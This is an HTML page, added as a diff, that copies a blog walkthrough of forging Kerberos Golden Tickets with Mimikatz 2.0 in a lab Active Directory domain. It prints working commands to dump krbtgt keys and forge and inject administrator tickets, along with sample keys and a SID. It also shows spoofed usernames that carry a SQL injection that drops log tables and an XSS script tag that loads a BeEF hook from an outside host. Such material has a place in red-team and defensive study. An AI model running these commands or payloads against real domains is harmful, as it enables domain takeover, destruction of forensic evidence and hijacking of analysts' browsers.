@@ -1,0 +1,63 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>BeneathTheWaves Walkthrough</title>
+</head><body><a href="From http://www.beneaththewaves.net/Projects/Mimikatz_20_-_Golden_Ticket_Walkthrough.html">From http://www.beneaththewaves.net/Projects/Mimikatz_20_-_Golden_Ticket_Walkthrough.html</a>&nbsp;<br/>
+<br/>
+The "executive summary" version of a Golden Ticket is that if you can obtain one of the encryption keys used by the krbtgt account for an Active Directory domain, Mimikatz 2.0 will allow you to forge arbitrary Kerberos authentication tickets for that domain. <br/>
+Those keys are not easily-obtained — unless someone has left an NTDS.DIT backup lying around, it probably requires access to a domain admin account's credentials — so the Golden Ticket functionality is sort of like the "New Game+" mode in the Silent Hill series: you've already won, and now you can play through again as an unstoppable juggernaut with a laser pistol and/or chainsaw.<br/>
+The easiest way to obtain the information you'll need is to run Mimikatz 2.0 on a domain controller for the domain you wish to compromise. Of course, this is also the method most likely to be detected. The bare minimum commands are:<br/>
+<ul>privilege::debug</ul>
+<ul><li style="list-style-type: none">lsadump::lsa /inject /name:krbtgt</li>
+<li style="list-style-type: none"></li>
+</ul>
+As of this writing, there are three encryption keys which can be used for the Golden Ticket functionality: <ul><li style="list-style-type: none">the RC4 key (which is the NTLM hash for the account) — 8ad36fef31e071eac7ab9d54a093cb54 in the example above, </li>
+<li style="list-style-type: none">the AES-128 HMAC key — 32ac54b805e47a19a84801d784c64464 in the example above, or </li>
+<li style="list-style-type: none">the AES-256 HMAC key — 8e3c00a957bcdc65a1b7c05e665b90bd79f28ca91079f0f537ebee390671409b in the example above.</li>
+<li style="list-style-type: none"></li>
+</ul>
+In addition to the keys, you will need to have the following additional pieces of information available:<ul><li style="list-style-type: none"></li>
+<li style="list-style-type: none">The target domain name (e.g. vln2012.local).</li>
+<li style="list-style-type: none">The SID of the target domain (this should be present in the output from the lsadump::lsa command — it's S-1-5-21-3871786346-2057636518-1625323419 in the example output above, or you can just strip the rightmost number off of a user SID from the domain).</li>
+<li style="list-style-type: none">The name of the user account to impersonate (e.g. Administrator).</li>
+<li style="list-style-type: none">The RID of the user account to impersonate. The RID is the rightmost number in a full SID. For example, the RID for the built-in Administrator account is 500.</li>
+<li style="list-style-type: none">The RIDs of the groups that that account should be a member of. The RID is the rightmost number in a full SID. For example, the RIDs for Domain Users and Domain Admins would be 512 and 513.</li>
+<li style="list-style-type: none"></li>
+</ul>
+Creating and using a Golden Ticket is easy. The following commands will purge any existing tickets, then create one using some example information from my lab domain, and inject it into the current session (the /ptt flag).<br/>
+<ul>privilege::debug</ul>
+<ul>kerberos::purge</ul>
+<ul><li style="list-style-type: none">kerberos::golden /domain:vln2012.local /sid:S-1-5-21-3871786346-2057636518-1625323419 /rc4:8ad36fef31e071eac7ab9d54a093cb54 /user:Administrator /id:500 /groups:500,501,513,512,520,518,519 /ptt</li>
+<li style="list-style-type: none"></li>
+</ul>
+<br/>
+This variation will save the ticket data to a file named forged.kirbi (in case I want to re-use the exact same ticket later, or generate it on one system and use it on another), then import it from that file into the current session:<br/>
+<ul><li style="list-style-type: none">privilege::debug</li>
+<li style="list-style-type: none">kerberos::purge</li>
+<li style="list-style-type: none">kerberos::golden /domain:vln2012.local /sid:S-1-5-21-3871786346-2057636518-1625323419 /rc4:8ad36fef31e071eac7ab9d54a093cb54 /user:Administrator /id:500 /groups:500,501,513,512,520,518,519 /ticket:forged.kirbi</li>
+<li style="list-style-type: none">kerberos::ptt forged.kirbi</li>
+<li style="list-style-type: none"></li>
+<li style="list-style-type: none"></li>
+</ul>
+If you don't have the NTLM hash of the krbtgt account's password, but you do have the AES-256 HMAC and/or AES-128 HMAC encryption keys for the account, you can substitute the aes256 or aes128 flags for rc4, e.g.:<ul><li style="list-style-type: none">kerberos::golden /domain:vln2012.local /sid:S-1-5-21-3871786346-2057636518-1625323419 /aes256:8e3c00a957bcdc65a1b7c05e665b90bd79f28ca91079f0f537ebee390671409b /user:Administrator /id:500 /groups:500,501,513,512,520,518,519 /ptt</li>
+<li style="list-style-type: none">...or...</li>
+<li style="list-style-type: none">kerberos::golden /domain:vln2012.local /sid:S-1-5-21-3871786346-2057636518-1625323419 /aes128:32ac54b805e47a19a84801d784c64464 /user:Administrator /id:500 /groups:500,501,513,512,520,518,519 /ptt</li>
+<li style="list-style-type: none"></li>
+<li style="list-style-type: none"></li>
+<li style="list-style-type: none"></li>
+<li style="list-style-type: none"></li>
+</ul>
+<br/>
+Fancy<br/>
+Spoofed Username and/or RID<br/>
+<br/>
+Because Kerberos is mostly-decentralized, target systems will generally trust the information in Kerberos tickets without validating that the account information is valid. For example, the following command will issue a ticket for a user whose RID is 500 (the domain Administrator account), but whose account name is Hey Brent, I heard you like corrupted forensic evidence, so I made you a Kerberos ticket with a spoofed name that also attempts to drop all of the tables in any upstream systems that are collecting Active Directory logon events'; EXEC sp_msforeachtable 'drop table ?'; --[1]:<br/>
+<ul><li style="list-style-type: none">kerberos::golden /domain:vln2012.local /sid:S-1-5-21-3871786346-2057636518-1625323419 /rc4:8ad36fef31e071eac7ab9d54a093cb54 /user:"Hey Brent, I heard you like corrupted forensic evidence, so I made you a Kerberos ticket with a spoofed name that also attempts to drop all of the tables in any upstream systems that are collecting Active Directory logon events'; EXEC sp_msforeachtable 'drop table ?'; --" /id:500 /groups:500,501,513,512,520,518,519 /ptt</li>
+<li style="list-style-type: none">&nbsp;</li>
+</ul>
+When using this combination (invalid name/valid RID), some types of auditing will log the spoofed name, and some will look up the account by its RID and log that account name instead.<ul><li style="list-style-type: none"></li>
+<li style="list-style-type: none">kerberos::golden /domain:vln2012.local /sid:S-1-5-21-3871786346-2057636518-1625323419 /rc4:8ad36fef31e071eac7ab9d54a093cb54 /user:"Hey Brent, I heard you like compromised workstations, so I made you a Kerberos ticket with a spoofed name that also attempts to inject a BeEF hook into the browser of anyone who views this logon event using a web-based event-correlation system:&lt;script language=\"javascript\" type=\"text/javascript\" src=\"//l33t.local/hook.js\"&gt;&lt;/script&gt;" /id:31337 /groups:500,501,513,512,520,518,519 /ptt</li>
+</ul>
+<br/>
+</body></html>
